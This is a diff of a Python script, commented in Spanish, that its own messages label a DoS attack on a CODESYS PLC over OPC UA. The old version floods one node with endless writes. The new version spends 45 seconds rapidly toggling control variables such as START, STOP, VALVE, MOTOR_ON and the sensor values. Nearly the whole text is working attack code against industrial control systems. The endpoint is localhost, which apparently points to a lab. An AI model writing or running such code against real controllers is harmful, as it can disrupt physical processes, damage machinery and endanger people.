@@ -4,41 +4,53 @@ import logging
 
 # Configuración
 PLC_ENDPOINT = "opc.tcp://127.0.0.1:4840"
-TARGET_NODE = "ns=4;s=|plc|CODESYS Control Win V3 x64"  # Nodo objetivo que ya identificaste
-INTERVAL = 0  # Tiempo entre escrituras. 0 = sin pausa
+VARIABLES = [
+    "START",
+    "STOP",
+    "SENSOR_1",
+    "SENSOR_2",
+    "VALVE",
+    "MOTOR_ON",
+    "LIGHT_ON",
+    "YES"
+]
+DURATION = 45  # segundos
+INTERVAL = 0.01  # frecuencia entre escrituras
 
-# Configurar logging para monitoreo
+# Setup
 logging.basicConfig(level=logging.INFO)
+start_time = time.time()
 
-print("[+] Iniciando ataque de denegación de servicio...")
+print(f"[+] Iniciando ataque DoS durante {DURATION} segundos con intervalo de {INTERVAL}s...")
 
 try:
     client = Client(PLC_ENDPOINT)
     client.connect()
     print("[+] Conexión establecida con el PLC")
 
-    node = client.get_node(TARGET_NODE)
+    while time.time() - start_time < DURATION:
+        for var_name in VARIABLES:
+            try:
+                node_id = f"ns=4;s=|var|{var_name}"
+                node = client.get_node(node_id)
 
-    # Bucle de escritura continua
-    counter = 0
-    while True:
-        try:
-            value = f"DOS_{counter}"
-            node.set_value(value)
-            logging.info(f"[+] Valor enviado: {value}")
-            counter += 1
-            time.sleep(INTERVAL)
-        except Exception as inner_error:
-            logging.error(f"[-] Fallo al escribir: {inner_error}")
-            break
+                # Leer y alternar el valor
+                current = node.get_value()
+                new_value = not current
+                node.set_value(new_value)
+
+                logging.info(f"[+] {var_name} cambiado de {current} a {new_value}")
+                time.sleep(INTERVAL)
+
+            except Exception as err:
+                logging.error(f"[-] Fallo al modificar {var_name}: {err}")
 
 except Exception as e:
-    logging.error(f"[-] Error al iniciar ataque: {e}")
+    logging.error(f"[-] Error al ejecutar ataque: {e}")
 
 finally:
     try:
         client.disconnect()
-        print("[+] Conexión cerrada")
+        print("[+] Conexión cerrada correctamente")
     except:
         pass
-
